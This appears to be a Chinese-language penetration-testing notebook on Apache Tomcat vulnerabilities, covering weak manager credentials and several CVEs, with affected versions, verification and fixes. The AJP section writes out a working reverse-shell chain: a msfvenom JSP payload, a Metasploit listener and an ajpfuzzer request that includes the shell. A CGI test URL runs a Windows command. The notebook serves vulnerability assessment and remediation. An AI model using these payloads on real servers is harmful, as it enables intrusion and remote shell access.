# tomcat
## 弱口令漏洞
### 漏洞说明
1. tomcat默认开启的manger 界面中，默认的用户名密码为tomcat:tomat
- manager（后台管理）
- manager-gui 拥有html页面权限
- manager-status 拥有查看status的权限
- manager-script 拥有text接口的权限，和status权限
- manager-jmx 拥有jmx权限，和status权限
2. host-manager（虚拟主机管理）
- admin-gui 拥有html页面权限
- admin-script 拥有text接口权限

### 影响范围
/
### 验证方法
poc_tomcat_weakpass.py

### 利用方法

**手工利用**:登录tomcat管理后台，上传包含恶意程序的war包，获取tomcat用户权限。
**msfconsole**:`exploit/multi/http/tomcat_mgr_upload`

### 修复方法
1、修改conf/tomcat-users.xml文件中的默认用户名和密码，设置密码为强口令。
1、在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。

2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。


## tomcat命令执行漏洞 CVE-2017-12615
### 漏洞说明
在tomcat中启用put方法会导致任意文件可以上传，从而导致服务器权限被获取。
### 影响范围
Apache Tomcat 7.0.0 – 7.0.79
### 验证方法
**pocsuite**:poc_tomcat_cmdexec

### 利用方法

### 修复方法
1、配置readonly值为True或注释参数，禁止使用PUT方法并重启tomcat。
注意：如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。

2、根据官方补丁升级最新版本。

## tomcat ajp协议任意文件读取漏洞 cve-2020-1938

### 漏洞说明
由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。
### 影响范围
**受影响版本**
- Apache Tomcat 6
- Apache Tomcat 7 < 7.0.100
- Apache Tomcat 8 < 8.5.51
- Apache Tomcat 9 < 9.0.31

**不受影响版本**
- Apache Tomcat = 7.0.100
- Apache Tomcat = 8.5.51
- Apache Tomcat = 9.0.31

### 验证方法
**pocsuite**:`poc_tomcat_ajp_read`

### 利用方法

**RCE**:
1. 使用 msf 生成反弹 shell 马，并且监听
```bash

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.223.129 LPORT=6666 R > shell.png

假设利用上传点，把此图片上传到了目标服务器 / log/shell.png。

在 msf 监听：

msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp

payload => java/jsp_shell_reverse_tcp

msf exploit(multi/handler) > set lhost 192.168.223.129

lhost => 192.168.223.129

msf exploit(multi/handler) > set lport 6666

lport => 6666

msf exploit(multi/handler) >exploit
```
2. 发送 AJP 包，获取 shell

使用 AJP 包构造工具来发送 ajp 包，以 ajpfuzzer 为例：

运行：`java -jar ajpfuzzer_v0.6.jar`

连接目标端口：`connect 192.168.223.1 8009`

执行以下命令：
```shell
forwardrequest 2 "HTTP/1.1" "/123.jsp" 192.168.223.1 192.168.223.1 porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request_uri:/","javax.servlet.include.path_info:log/shell.png","javax.servlet.include.servlet_path:/"
```
![](/Users/seven/Desktop/pocs/midware/tomcat/tomcat.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvdXRoV2luZDA=,size_16,color_FFFFFF,t_70.png)



可以看到，请求发送成功后，shell.png 被作为 jsp 解析，成功获取目标服务器的 shell。



![](/Users/seven/Desktop/pocs/midware/tomcat/tomcat.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvdXRoV2luZDA=,size_16,color_FFFFFF,t_70-20200810174750806.png)

### 修复方法

目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：

| 版本号                | 下载地址                                 |
| --------------------- | ---------------------------------------- |
| Apache Tomcat 7.0.100 | http://tomcat.apache.org/download-70.cgi |
| Apache Tomcat 8.5.51  | http://tomcat.apache.org/download-80.cgi |
| Apache Tomcat 9.0.31  | http://tomcat.apache.org/download-90.cgi |



如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。

一:若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。

具体操作：

（1）编辑 <CATALINA_BASE>/conf/server.xml，找到如下行（<CATALINA_BASE> 为 Tomcat 的工作目录）：

```
<Connector port="8009"protocol="AJP/1.3" redirectPort="8443" />
```

![img](/Users/seven/Desktop/pocs/midware/tomcat/tomcat.assets/image-4.png)

（2）将此行注释掉（也可删掉该行）：

```
<!--<Connectorport="8009" protocol="AJP/1.3"redirectPort="8443" />-->
```

（3）保存后需重新启动Tomcat，规则方可生效。

## 远程代码执行漏洞 CVE-2019-0232
### 漏洞说明
Apache Tomcat是美国阿帕奇（Apache）软件基金会的一款轻量级Web应用服务器。该程序实现了对Servlet和JavaServer Page（JSP）的支持。
4月11日，Apache官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。
触发该漏洞需要同时满足以下条件：
1. 系统为Windows
2. 启用了CGI Servlet（默认为关闭）
3. 启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）

### 影响范围
Apache Tomcat 9.0.0.M1 to 9.0.17
Apache Tomcat 8.5.0 to 8.5.39
Apache Tomcat 7.0.0 to 7.0.93

### 验证方法
http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cnet.exe+user

该漏洞触发条件较为复杂，不做讨论


## Tomcat websocket拒绝服务漏洞 CVE-2020-13935
### 漏洞说明
2020年7月14日，Apache官方通报Apache Tomcat 两个拒绝服务漏洞：CVE-2020-13934、CVE-2020-13935，并发布安全更新。
Apache Tomcat WebSocket帧中的有效负载长度未正确验证，无效的有效载荷长度可能会触发无限循环，多有效负载长度无效的请求可能会导致拒绝服务。

 

### 影响范围
Apache Tomcat 10.0.0-M1~10.0.0-M6
Apache Tomcat 9.0.0.M1~9.0.36
Apache Tomcat 8.5.0~8.5.56
Apache Tomcat 7.0.27~7.0.104
 

### 验证方法
https://github.com/RedTeamPentesting/CVE-2020-13935

### 修复方案
- 升级到Apache Tomcat 10.0.0-M7+
- 升级到Apache Tomcat 9.0.37+
- 升级到Apache Tomcat 8.5.57+